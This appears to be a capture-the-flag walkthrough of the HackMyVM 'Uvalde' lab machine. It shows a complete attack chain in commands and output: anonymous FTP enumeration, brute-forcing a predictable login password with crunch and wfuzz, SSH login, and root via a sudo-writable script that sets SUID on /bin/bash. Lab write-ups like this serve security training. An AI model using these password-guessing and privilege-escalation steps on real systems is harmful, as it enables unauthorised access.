first start enumeration with nmap

```
# Nmap 7.93 scan initiated Sun Feb 26 11:03:59 2023 as: nmap -sC -sV -T4 -oN normal.tcp -p 21,22,80 -Pn 192.168.0.102
Nmap scan report for 192.168.0.102
Host is up (0.00055s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000         5154 Jan 28 19:54 output
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a09a4dad7db99eea55105e9afe70890 (RSA)
|   256 cb426abe22132cf257f980d1f7fb885c (ECDSA)
|_  256 443cb40faac394fa231519e3e5185694 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Agency - Start Bootstrap Theme
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 26 11:04:12 2023 -- 1 IP address (1 host up) scanned in 13.46 seconds
```
cool we know what ports are open now, let's start enumeration with port 21 first.

## Enumerating port 21 (FTP)

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
└─$ ftp 192.168.0.102
Connected to 192.168.0.102.
220 (vsFTPd 3.0.3)
Name (192.168.0.102:n16hth4wk): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42148|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000         5154 Jan 28 19:54 output
226 Directory send OK.
ftp> get output
local: output remote: output
229 Entering Extended Passive Mode (|||9031|)
150 Opening BINARY mode data connection for output (5154 bytes).
100% |*************************************************************************************************************************|  5154       16.06 MiB/s    00:00 ETA
226 Transfer complete.
5154 bytes received in 00:00 (5.70 MiB/s)
ftp> ^D
221 Goodbye.
```
from our nmap scan, we can see anonymous login is allowed for ftp. logged in and we got a file `output`, downloaded the file into our machine. also i tried to upload a file, got permission denied. let's check the content of `output`

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
└─$ cat output                                                                     
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id                                                               
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)    
matthew@debian:~$ ls -al                                                           
total 32                                                                           
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .     
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..      
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc                                                                                                              
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config                         
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local                          
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile                        
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript                     
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt                       
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu                             
                                                                                
 ▄▄                            ▄▄                                               
 ██                            ██                                               
 ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀   ████▄██▄  ▀██  ███  ██▄  ▄██  ████▄██▄  
 ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██     ██ ██ ██   ██▄ ██    ██  ██   ██ ██ ██  
 ██    ██  ▄██▀▀▀██  ██        ██▀██▄    ██ ██ ██    ████▀    ▀█▄▄█▀   ██ ██ ██  
 ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄   ██ ██ ██     ███      ████    ██ ██ ██  
 ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀  ▀▀ ▀▀ ▀▀     ██        ▀▀     ▀▀ ▀▀ ▀▀  
                                                    ███                          
                                                                                 
                                                                                 
                                                                                 
                                                                                 
            ▄████▄   ██    ██                                                    
           ██▄▄▄▄██  ██    ██                                                    
           ██▀▀▀▀▀▀  ██    ██                                                    
    ██     ▀██▄▄▄▄█  ██▄▄▄███                                                    
    ▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀                                                   
                                                                                 
                                                                                
matthew@debian:~$ exit
exit                                                                               
                                                                                   
Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]
```
checking the content of `output` we got an output of an ssh user dir. and we can see the username `matthew`. let's keep this name in our note. moving to the next port `80`.


## Enumerating Port 80 (http)

![image](https://user-images.githubusercontent.com/87468669/221404871-48a2e425-f667-4eef-a3a8-8cd136bb76ee.png)

opening the IP on our browser, we got a web page service all about designs and the likes, navigating around, checked source page got nothing . let's burst hidden dirs.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
└─$ ffuf -u "http://192.168.0.102/FUZZ" -w /usr/share/wordlists/dirb/big.txt  -fc 403 -fs 0 -ic  -e .txt,.php,.bak,.sql,.zip 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.102/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .txt .php .bak .sql .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
 :: Filter           : Response size: 0
________________________________________________

create_account.php      [Status: 200, Size: 1003, Words: 238, Lines: 48, Duration: 16ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 8ms]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 26ms]
index.php               [Status: 200, Size: 29604, Words: 8689, Lines: 715, Duration: 9ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 12ms]
login.php               [Status: 200, Size: 1022, Words: 126, Lines: 61, Duration: 14ms]
mail                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 9ms]
vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 8ms]
:: Progress: [122814/122814] :: Job [1/1] :: 3436 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```
cool we got hidden dirs, let's create an account. 

![image](https://user-images.githubusercontent.com/87468669/221405294-2eb6e353-d3b9-4956-9053-ebb52539aee3.png)

![image](https://user-images.githubusercontent.com/87468669/221416995-30e66e60-f0b5-49eb-b930-046fccba57e5.png)

after creating an account, got a base64 encoded text in the url link. copied it 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
└─$ echo "dXNlcm5hbWU9bmlnaHRoYXdrJnBhc3N3b3JkPW5pZ2h0aGF3azIwMjNANjA4MQ==" | base64 -d 
username=nighthawk&password=nighthawk2023@6081 
```
decoded the text and we got to see creates the accout success but it automatically gives us a password. 🤔 let's login

![image](https://user-images.githubusercontent.com/87468669/221417115-e9ae52d0-9493-4668-b0b9-be059b056a8f.png)

logged , got a page under construction. 🤔... let's try create another account and see it will assign the same password for us.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
└─$ echo "dXNlcm5hbWU9aGFja2VyJnBhc3N3b3JkPWhhY2tlcjIwMjNAMTEzMA==" | base64 -d
username=hacker&password=hacker2023@1130
```
cool we can see it takes the username supplid , 2023, @, random 4 digit number `(usrname2023@random 4 digit)` and assign it as our password. let's try fuzz the random number to get the password for user `matthew`, since it might be `matthew2023@XXXX`. 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
└─$ crunch 4 4 1234567890 -o numb.txt                                                                         
Crunch will now generate the following amount of data: 50000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

crunch: 100% completed generating output
```
first generate random 4 digit number using crunch. now let run ffuf to fuzz the number.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
└─$ wfuzz -X POST -d "username=matthew&password=matthew2023@FUZZ" -w numb.txt -u http://192.168.0.102/login.php  --hl 60
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.0.102/login.php
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000000444:   302        0 L      0 W        0 Ch        "1554"                                                                                               

Total time: 21.52361
Processed Requests: 10000
Filtered Requests: 9999
Requests/sec.: 464.6060
```
using wfuzz instead to fuzz cause ffuf did not bring the expected result. we got the password for user `matthew:matthew2023@1554` now let's login. 

![image](https://user-images.githubusercontent.com/87468669/221418553-f57c5618-a12a-4c73-8ef0-741ca41a5014.png)

logged in as user `matthew`, got the same page under construction. let's try login ssh using the password.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
└─$ ssh matthew@192.168.0.102
The authenticity of host '192.168.0.102 (192.168.0.102)' can't be established.
ED25519 key fingerprint is SHA256:S2tp/jV32/GtUP68f14Rac4/yZXhbMmyut+ZqO+ZOl4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.102' (ED25519) to the list of known hosts.
matthew@192.168.0.102's password: 
Permission denied, please try again.
matthew@192.168.0.102's password: 
Linux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
matthew@uvalde:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
matthew@uvalde:~$ whoami 
matthew
matthew@uvalde:~$ 
```
boom!!! we are in a user `matthew` 


## Privilege Escalation

```
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
matthew@uvalde:~$ 
```
by checking sudo permission, we can see we can run `/bin/bash /opt/superhack` as sudo without password. let's check the content of this file

```
matthew@uvalde:/opt$ rm -rf superhack 
matthew@uvalde:/opt$ echo "chmod +s /bin/bash" > superhack
matthew@uvalde:/opt$ sudo -u root /bin/bash /opt/superhack
matthew@uvalde:/opt$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
matthew@uvalde:/opt$
matthew@uvalde:/opt$ /bin/bash -p 
bash-5.1# id && whoami
uid=1000(matthew) gid=1000(matthew) euid=0(root) egid=0(root) groups=0(root),1000(matthew)
root
bash-5.1#
```
deleted the superhack file, create a new one with suid. doing `/bin/bash -p` gave us a root shell.

![image](https://user-images.githubusercontent.com/87468669/221443415-68f5b6e8-5ada-4246-9d48-17099ccd66c5.png)

and we are through 😉.


